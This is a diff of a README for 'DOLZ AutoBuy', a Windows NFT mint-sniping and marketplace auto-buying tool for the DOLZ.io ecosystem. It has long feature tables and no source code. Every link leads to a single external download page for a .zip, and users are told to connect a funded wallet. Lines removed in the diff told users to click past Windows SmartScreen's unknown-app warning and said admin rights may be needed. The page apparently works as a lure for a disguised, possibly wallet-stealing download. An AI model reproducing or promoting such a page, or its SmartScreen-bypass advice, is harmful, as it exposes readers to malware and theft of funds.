@@ -1,12 +1,12 @@
-# DOLZ AutoBuyer
+# DOLZ AutoBuy
 
 <p align="center">
-  <strong>Automated DOLZ NFT Minting & Marketplace Sniper</strong>
+  <strong>Automated DOLZ Drops & NFT Marketplace Assistant</strong>
 </p>
 
 <p align="center">
   <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
-    <img src="https://img.shields.io/badge/GET%20DOLZ%20AUTOBUYER-00C853?style=for-the-badge&logo=ethereum&logoColor=white" alt="GET DOLZ AutoBuyer">
+    <img src="https://img.shields.io/badge/GET%20DOLZ%20AUTOBUY-00C853?style=for-the-badge&logo=ethereum&logoColor=white" alt="Get DOLZ AutoBuy">
   </a>
   <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
     <img src="https://img.shields.io/badge/MINT%20SNIPER-EXPERIMENTAL-8b5cf6?style=for-the-badge" alt="Mint Sniper Experimental">
@@ -18,7 +18,7 @@
     <img src="https://img.shields.io/badge/POLYGON-✓-2ea44f?style=flat-square" alt="Polygon Supported">
   </a>
   <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
-    <img src="https://img.shields.io/badge/NFT%20MINTING-✓-2ea44f?style=flat-square" alt="NFT Minting Supported">
+    <img src="https://img.shields.io/badge/DOLZ%20DROPS-✓-2ea44f?style=flat-square" alt="DOLZ Drops Supported">
   </a>
   <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
     <img src="https://img.shields.io/badge/MARKETPLACE-✓-2ea44f?style=flat-square" alt="Marketplace Supported">
@@ -29,135 +29,472 @@
 </p>
 
 <p align="center">
-  <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
-    <img src="https://github.com/DOLZ-AutoBuyer-2026/.github/blob/main/assets/image/1.png?raw=true" width="46%" alt="DOLZ AutoBuyer Interface">
-  </a>
-  <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
-    <img src="https://github.com/DOLZ-AutoBuyer-2026/.github/blob/main/assets/image/2.png?raw=true" width="46%" alt="DOLZ AutoBuyer Interface">
-  </a>
+  <img src="https://github.com/DOLZ-AutoBuyer-2026/.github/blob/main/assets/1.png?raw=true" width="46%" alt="DOLZ AutoBuy Interface">
+  <img src="https://github.com/DOLZ-AutoBuyer-2026/.github/blob/main/assets/2.png?raw=true" width="46%" alt="DOLZ AutoBuy Interface">
 </p>
 
 ---
 
 ## Overview
 
-DOLZ AutoBuyer is a versatile automation utility designed to simplify the monitoring and purchasing of DOLZ NFTs.
+DOLZ AutoBuy is a desktop automation assistant built specifically around the DOLZ.io collectible ecosystem.
 
-It continuously monitors configured DOLZ drops, marketplace listings, and auctions, allowing users to react to new opportunities without manually refreshing pages.
+It is designed for collectors who want to monitor DOLZ Drops, track marketplace activity, follow collection releases, and manage predefined purchase conditions from one interface instead of constantly checking the DOLZ website manually.
 
-The tool can detect new NFT minting events, monitor marketplace activity, filter listings by price and collection, and optionally automate eligible purchases according to user-defined limits.
+The application focuses on three main workflows:
 
-Before executing any transaction, the utility checks the configured purchase conditions to help prevent unwanted purchases.
+- Monitoring upcoming and active DOLZ Drops
+- Watching secondary-market NFT listings
+- Tracking supported auction activity
+
+DOLZ.io currently exposes dedicated areas for Drops, Marketplace, Rewards, $DOLZ, Bridge, and wallet profiles. Wallet profiles can include trading-card ownership, estimated collection value, BabyDOLZ balance, rewards, season progress, and rarity distribution. DOLZ's ecosystem also includes adult collectible cards and other NFT categories.
 
 ---
 
-## Supported DOLZ Operations
+## What DOLZ AutoBuy Does
 
-| Operation | Description |
+DOLZ AutoBuy connects the DOLZ collecting workflow with configurable automation rules.
+
+Instead of reacting manually to every new listing or drop, the user defines what should be monitored and what conditions must be satisfied before an automated action is attempted.
+
+The application can be organized around:
+
+| Module | Purpose |
 |:--|:--|
-| **Mint Sniper** | Monitors upcoming DOLZ NFT drops and reacts when minting becomes available. |
-| **Marketplace AutoBuyer** | Monitors marketplace listings and identifies NFTs matching configured criteria. |
-| **Auction Sniper** | Monitors supported auctions and tracks qualifying auction activity. |
+| **Drops Monitor** | Watches DOLZ Drops and release states. |
+| **Mint Sniper** | Experimental monitoring and automated mint workflow. |
+| **Marketplace AutoBuy** | Searches supported marketplace listings using user-defined conditions. |
+| **Auction Monitor** | Tracks supported DOLZ auction activity and bid conditions. |
+| **Collection Scanner** | Analyzes selected collections, seasons, rarity and metadata. |
+| **Wallet Monitor** | Tracks wallet activity and transaction status. |
+| **Activity Log** | Keeps a local history of monitoring events and actions. |
+| **Notifications** | Sends optional alerts when configured conditions are triggered. |
+
+---
+
+## Drops Monitor
+
+The **Drops Monitor** is the main module for following DOLZ releases.
+
+It can display upcoming, active, and completed drops and continuously check the selected release for changes.
+
+### Drop Tracking
+
+- Upcoming drop detection
+- Active mint detection
+- Release countdown
+- Drop status monitoring
+- Collection identification
+- Season information
+- Mint availability checks
+- Configurable refresh interval
+- Local event history
+
+The interface can highlight a drop as **Coming**, **Live**, **Sold Out**, or **Ended**, depending on the information available from the monitored DOLZ source.
 
 ---
 
 ## Mint Sniper
 
-DOLZ AutoBuyer includes an experimental **Mint Sniper** mode designed for automated monitoring of DOLZ NFT drops.
+The **Mint Sniper** is an experimental module for users who want to automate their response to a DOLZ Drop becoming available.
 
-The utility can monitor the selected drop, detect when minting becomes available, and attempt to submit the mint transaction according to the configured quantity and spending limits.
+The user can select a target drop and define the limits that must be respected before a mint attempt is made.
 
-This eliminates the need to manually refresh the DOLZ drop page and react to the exact moment a mint becomes available.
+### Mint Controls
 
-> **Note:** Mint Sniper is experimental. Behavior may vary depending on the specific DOLZ collection, smart contract, marketplace, blockchain network, and available APIs.
+| Setting | Description |
+|:--|:--|
+| **Target Drop** | DOLZ release selected for monitoring. |
+| **Mint Quantity** | Maximum quantity to attempt. |
+| **Maximum Spend** | Maximum amount allocated to the mint. |
+| **Start Condition** | Determines when the automation becomes active. |
+| **Retry Limit** | Limits repeated attempts after a failed transaction. |
+| **Dry Run** | Simulates the workflow without submitting a live transaction. |
+| **Emergency Stop** | Immediately disables the active automation. |
 
----
-
-## Marketplace AutoBuyer
-
-The **Marketplace AutoBuyer** monitors DOLZ NFT listings and looks for opportunities that match the user's criteria.
-
-Users can configure a maximum purchase price and select the collections or NFT characteristics they are interested in.
-
-When a matching listing is detected, the software can automatically attempt to purchase the NFT.
-
-The system is designed to react quickly to newly listed NFTs while applying the configured price and safety limits before submitting a transaction.
+The Mint Sniper should be treated as experimental because drop timing, contract behavior, network congestion, transaction requirements, and availability can differ between releases.
 
 ---
 
-## Auction Sniper
+## Marketplace AutoBuy
 
-DOLZ AutoBuyer can also monitor supported DOLZ auctions and track changes in auction activity.
+The **Marketplace AutoBuy** module is designed for secondary-market monitoring.
 
-The **Auction Sniper** mode can be configured with a maximum bid and can monitor the remaining auction time, allowing the software to react to qualifying auction events without requiring constant manual interaction.
+It continuously checks supported DOLZ listings and compares newly detected items with the user's purchase rules.
 
-> **Note:** Auction behavior may vary depending on the specific DOLZ collection, marketplace, smart contract, and auction implementation.
+### Listing Filters
+
+Users can define rules such as:
+
+- Target collection
+- Maximum price
+- Minimum rarity
+- Maximum quantity
+- Season
+- NFT traits
+- Listing status
+- Seller/listing information
+- Purchase cooldown
+- Total spending limit
+
+When a listing satisfies the configured rules, the application can flag it as a match and, when live automation is enabled, attempt the configured purchase workflow.
 
 ---
 
-## Key Features
+## Smart Buy Rules
 
-### Automation
+DOLZ AutoBuy can use several conditions at the same time instead of relying only on price.
 
-- Automatically monitors configured DOLZ NFT drops
-- Detects when selected NFT mints become available
-- Provides an experimental Mint Sniper mode
-- Automatically monitors DOLZ marketplace listings
-- Monitors supported DOLZ auctions
-- Designed to run continuously in the background
+Example:
 
-### Marketplace & NFT Management
+```text
+Collection = Selected DOLZ Collection
+AND
+Maximum Price <= 1.50 MATIC
+AND
+Rarity = Legendary
+AND
+Season = Selected Season
+AND
+Daily Spending Limit not exceeded
+```
 
-- Configurable maximum purchase prices
-- Collection-based NFT filtering
-- Metadata-based filtering
-- Automated marketplace purchases
-- Configurable maximum auction bids
-- Configurable purchase conditions
+This allows collectors to create targeted strategies for specific DOLZ cards instead of automatically reacting to every marketplace listing.
 
-### Transaction Management
+---
 
-- Transaction status monitoring
-- Pending transaction tracking
-- Successful transaction tracking
-- Failed transaction tracking
-- Activity and transaction logs
-- Configurable spending limits
-- Configurable purchase limits
+## Collection Scanner
 
-### Notifications
+The **Collection Scanner** is designed around information available from DOLZ wallet and collection views.
 
-- Optional Telegram notifications
-- Optional Discord notifications
+It can organize information such as:
 
-### Testing & Safety
+- Owned trading cards
+- Estimated collection value
+- Season progress
+- Rarity distribution
+- BabyDOLZ balance
+- Accumulated rewards
+- Collection completion
+- Missing cards
+- Recently acquired items
 
-- Dry Run mode for testing automation without submitting transactions
-- Transaction condition checks before execution
-- Stop Bot functionality
-- Emergency-stop option
-- Portable application design
+The scanner can help identify which DOLZ assets are already owned and which collection segments still require attention.
+
+---
+
+## Rarity & Season Filters
+
+For supported collection data, AutoBuy can provide additional filtering based on rarity and season.
+
+Example filters:
+
+```text
+Season: Season 11
+Rarity: Legendary / Epic
+Price: Up to configured maximum
+Status: Available
+Collection: Selected collection
+```
+
+This makes it possible to monitor a narrow subset of the DOLZ marketplace rather than the entire listing feed.
+
+---
+
+## Auction Monitor
+
+The **Auction Monitor** follows supported DOLZ auction activity.
+
+It can display:
+
+- Current auction status
+- Remaining time
+- Current bid
+- Configured maximum bid
+- Target collection
+- Bid eligibility
+- Transaction state
+
+The optional **Auction Sniper** workflow can evaluate the configured conditions before attempting an eligible bid.
+
+> **Note:** Auction functionality depends on the specific DOLZ marketplace and smart-contract implementation. Not every collectible or release necessarily uses the same auction mechanism.
+
+---
+
+## Wallet Monitor
+
+The **Wallet Monitor** provides a centralized view of the wallet used by the application.
+
+Possible dashboard information includes:
+
+- Connected wallet
+- Active blockchain network
+- Available balance
+- Recent transactions
+- Pending transactions
+- Successful transactions
+- Failed transactions
+- NFT acquisition history
+- Spending totals
+
+The wallet monitor is intended to make automated activity easier to review without constantly switching between different pages.
+
+---
+
+## Spending Protection
+
+Automated NFT purchases can be restricted using multiple limits.
+
+### Global Limits
+
+- Maximum transaction value
+- Maximum daily spending
+- Maximum number of purchases
+- Maximum mint quantity
+- Maximum auction bid
+- Maximum retry count
+- Purchase cooldown
+
+Before a transaction is submitted, the application can validate the configured limits and cancel the action if a condition is not satisfied.
+
+---
+
+## Dry Run Mode
+
+**Dry Run** allows the user to test the configured automation without submitting live blockchain transactions.
+
+During a dry run, the application can show:
+
+```text
+LISTING DETECTED
+        |
+        v
+FILTER MATCH
+        |
+        v
+PRICE LIMIT PASSED
+        |
+        v
+PURCHASE WOULD BE ATTEMPTED
+        |
+        v
+DRY RUN — TRANSACTION NOT SENT
+```
+
+This mode is recommended for validating collection filters, price limits, mint quantities, and notification rules before enabling live automation.
+
+---
+
+## Notifications
+
+DOLZ AutoBuy can provide optional notifications for important events.
+
+Supported notification concepts include:
+
+- New Drop detected
+- Drop is live
+- Mint condition matched
+- Marketplace listing matched
+- Purchase attempted
+- Purchase completed
+- Transaction failed
+- Auction condition matched
+- Spending limit reached
+- Bot stopped
+
+Telegram and Discord can be used as optional notification destinations where configured.
+
+---
+
+## Activity Dashboard
+
+The main dashboard can provide a real-time summary of the automation state.
+
+Example metrics:
+
+| Metric | Example |
+|:--|:--:|
+| Listings Detected | 24 |
+| Matching Listings | 6 |
+| Purchases Completed | 3 |
+| Failed Transactions | 0 |
+| Drops Monitored | 4 |
+| Auctions Monitored | 2 |
+| Current Network | Polygon |
+| Bot Status | Running |
+
+The dashboard is intended to make the state of the automation immediately visible.
+
+---
+
+## Transaction Center
+
+Every automated action can be assigned a status:
+
+- **Detected**
+- **Matched**
+- **Preparing**
+- **Submitted**
+- **Pending**
+- **Confirmed**
+- **Failed**
+- **Cancelled**
+
+The transaction center can retain the timestamp, action type, target NFT, configured limit, and final result for later review.
+
+---
+
+## Automation Profiles
+
+Users can save multiple configurations for different collecting strategies.
+
+Example profiles:
+
+### Conservative
+
+```text
+Low maximum price
+Low daily spending limit
+Dry Run enabled
+Manual confirmation preferred
+```
+
+### Collection Hunter
+
+```text
+Specific collection
+Selected seasons
+Selected rarity
+Higher matching priority
+Marketplace monitoring enabled
+```
+
+### Drop Watcher
+
+```text
+Upcoming DOLZ Drops
+Mint availability monitoring
+Configured quantity
+Strict maximum spend
+Notifications enabled
+```
+
+Profiles make it possible to switch between different monitoring configurations without rebuilding every filter manually.
+
+---
+
+## Proposed Advanced Features
+
+The following features are planned/conceptual extensions of the AutoBuy workflow and should be considered proposed functionality rather than official DOLZ.io features.
+
+### Smart Floor Tracker
+
+Track observed marketplace prices for a selected collection and maintain a local reference range.
+
+### Rarity Alerts
+
+Notify the user when a listing matching a selected rarity appears.
+
+### Collection Completion Mode
+
+Identify missing cards from a selected season and prioritize matching marketplace listings.
+
+### Price History
+
+Store observed listing prices locally to provide a basic historical price view.
+
+### Duplicate Protection
+
+Prevent repeated purchases of the same token or collection item when duplicate buying is disabled.
+
+### Budget Scheduler
+
+Allow separate spending limits for daily, weekly, or per-drop automation.
+
+### Multi-Target Monitoring
+
+Monitor several DOLZ collections or drops simultaneously from one dashboard.
+
+### Rule Priority
+
+Assign different priority levels to purchase rules so that more important collection targets are evaluated first.
+
+---
+
+## DOLZ-Specific Workflow
+
+```text
+DOLZ.io
+   |
+   +-------------------+
+   |                   |
+   v                   v
+  DROPS            MARKETPLACE
+   |                   |
+   v                   v
+Drop Monitor       Listing Scanner
+   |                   |
+   v                   v
+Mint Rules          Buy Rules
+   |                   |
+   +---------+---------+
+             |
+             v
+      Condition Engine
+             |
+             v
+       Limit Validation
+             |
+             v
+       Dry Run / Live
+             |
+             v
+     Transaction Center
+             |
+             v
+     Logs & Notifications
+```
+
+---
+
+## DOLZ Ecosystem Integration
+
+DOLZ.io currently exposes areas including **DROPS**, **Marketplace**, **Rewards**, **Buy $DOLZ**, and **Bridge**. Its wallet profile pages can show trading-card ownership, estimated value, BabyDOLZ balance, accumulated rewards, season distribution, and rarity distribution.
+
+The broader DOLZ ecosystem also covers collectible categories such as iStripper adult trading cards, VRParadise 3D NFTs, and partner NFTs.
+
+AutoBuy is focused specifically on the monitoring and automation layer around collectible activity; it does not represent every feature of the DOLZ platform.
+
+---
+
+## Network Support
+
+The automation interface can be configured for supported blockchain networks used by the DOLZ ecosystem.
+
+Network configuration may include:
+
+- Network selection
+- RPC endpoint
+- Wallet address
+- Transaction settings
+- Gas configuration
+- Connection status
+
+DOLZ.io also provides bridge functionality for moving supported $DOLZ assets between networks including Ethereum, Polygon, and Base.
 
 ---
 
 ## System Requirements
 
-DOLZ AutoBuyer is designed to run on modern desktop and server systems capable of maintaining a stable blockchain connection.
-
-Available features may vary depending on the DOLZ collection, marketplace, smart contract, and supported blockchain network.
-
 | Component | Requirement |
 |:--|:--|
-| **Operating System** | Windows 10 or Windows 11 (64-bit) |
-| **CPU** | Modern dual-core processor or newer |
-| **RAM** | 512 MB or more |
-| **Storage** | A small amount of free disk space for the utility and transaction logs |
+| **Operating System** | Windows 10 / Windows 11 64-bit |
+| **CPU** | Modern dual-core processor or better |
+| **RAM** | 512 MB minimum |
+| **Storage** | Small amount of free space for application data and logs |
 | **Network** | Stable Internet connection |
-| **Wallet** | A compatible blockchain wallet with sufficient funds |
-| **RPC** | Access to a compatible blockchain RPC endpoint |
-| **Permissions** | Administrator rights may be required in certain environments |
-
-> **Note:** Compatibility may vary depending on the specific DOLZ collection, NFT contract, marketplace, blockchain network, and available APIs.
+| **Wallet** | Compatible blockchain wallet |
+| **RPC** | Compatible RPC endpoint |
 
 ---
 
@@ -165,11 +502,11 @@ Available features may vary depending on the DOLZ collection, marketplace, smart
 
 ### 1. Download
 
-Download the latest version of **DOLZ AutoBuyer**:
+Download the latest version of **DOLZ AutoBuy**:
 
 <p align="center">
   <a href="https://DOLZ-AutoBuyer-2026.github.io/.github">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20DOLZ%20AUTOBUYER-00C853?style=for-the-badge&logo=ethereum&logoColor=white" alt="Download DOLZ AutoBuyer">
+    <img src="https://img.shields.io/badge/DOWNLOAD%20DOLZ%20AUTOBUY-00C853?style=for-the-badge&logo=ethereum&logoColor=white" alt="Download DOLZ AutoBuy">
   </a>
 </p>
 
@@ -177,101 +514,48 @@ Download the latest version of **DOLZ AutoBuyer**:
 
 Extract the `.zip` archive and launch the application.
 
-### 3. Windows SmartScreen
+### 3. Configure Network
 
-If **Windows SmartScreen** displays a warning about an unknown application, click **"More info"** and then select **"Run anyway"**.
+Select the supported network and configure the RPC endpoint.
 
-### 4. Launch
+### 4. Configure Wallet
 
-Launch **DOLZ AutoBuyer**.
+Connect the wallet intended for the selected monitoring or transaction workflow.
 
-The utility will initialize the configured blockchain connection and load the available DOLZ monitoring options.
+### 5. Select DOLZ Targets
 
-### 5. Configure Wallet
+Choose the Drops, collections, listings, or auctions that should be monitored.
 
-Connect or configure the wallet that will be used for NFT transactions.
+### 6. Configure Rules
 
-### 6. Select Target
+Set the maximum price, mint quantity, rarity, collection, spending limits, and other applicable conditions.
 
-Select the desired DOLZ collection, NFT drop, marketplace, or auction you want to monitor.
+### 7. Run a Dry Test
 
-### 7. Configure Mint Sniper
+Enable **Dry Run** and verify that the application detects the intended DOLZ events correctly.
 
-For upcoming NFT drops, select **Mint Sniper** mode and configure the desired mint quantity and maximum spending limit.
+### 8. Start Automation
 
-### 8. Configure AutoBuyer
-
-For marketplace listings, select **AutoBuyer** mode and configure the maximum NFT purchase price and available collection filters.
-
-### 9. Configure Auction Sniper
-
-For supported auctions, select **Auction Sniper** mode and configure the maximum bid amount.
-
-### 10. Start Monitoring
-
-Start the monitoring process and wait for the selected DOLZ event.
-
-When a matching opportunity is detected, the utility will perform the configured action and display the transaction status.
-
----
-
-## Recommended Configuration
-
-It is recommended to start with **Dry Run** mode before enabling live transactions.
-
-Verify that the following settings are correct:
-
-- Selected collection
-- NFT drop
-- Mint quantity
-- Maximum purchase price
-- Maximum bid amount
-- Wallet configuration
-- RPC endpoint
-- Transaction settings
-- Notification settings
-
-After verifying the configuration, live transactions can be enabled according to the configured limits.
+Enable the desired monitoring module and review the activity dashboard.
 
 ---
 
 ## Security
 
-Before enabling live transactions, make sure the configured wallet contains only the amount you are willing to spend.
+DOLZ AutoBuy should never require users to disclose their seed phrase or recovery phrase to the application publisher or another third party.
 
-Never share the following with third parties:
+Use a dedicated wallet for automated activity when appropriate and keep strict spending limits enabled.
 
-- Wallet seed phrase
-- Private key
-- Recovery phrase
-- Sensitive wallet credentials
+Before enabling live transactions, verify:
 
-If you need to stop automated activity, use the **Stop Bot** or emergency-stop option before making any further configuration changes.
+- Wallet address
+- Network
+- RPC endpoint
+- Target collection
+- NFT contract
+- Maximum price
+- Mint quantity
+- Maximum bid
+- Spending limits
 
----
-
-## Operation Flow
-
-```text
-DOLZ Drop / Marketplace / Auction
-                |
-                v
-        Event Monitoring
-                |
-                v
-       Opportunity Detected
-                |
-                v
-      Configuration Validation
-                |
-                v
-        Price / Limit Check
-                |
-                v
-       Transaction Preparation
-                |
-                v
-        Transaction Execution
-                |
-                v
-       Status & Activity Logs
+If unexpected activity occurs, immediately stop the automation and review the wallet's transaction history.
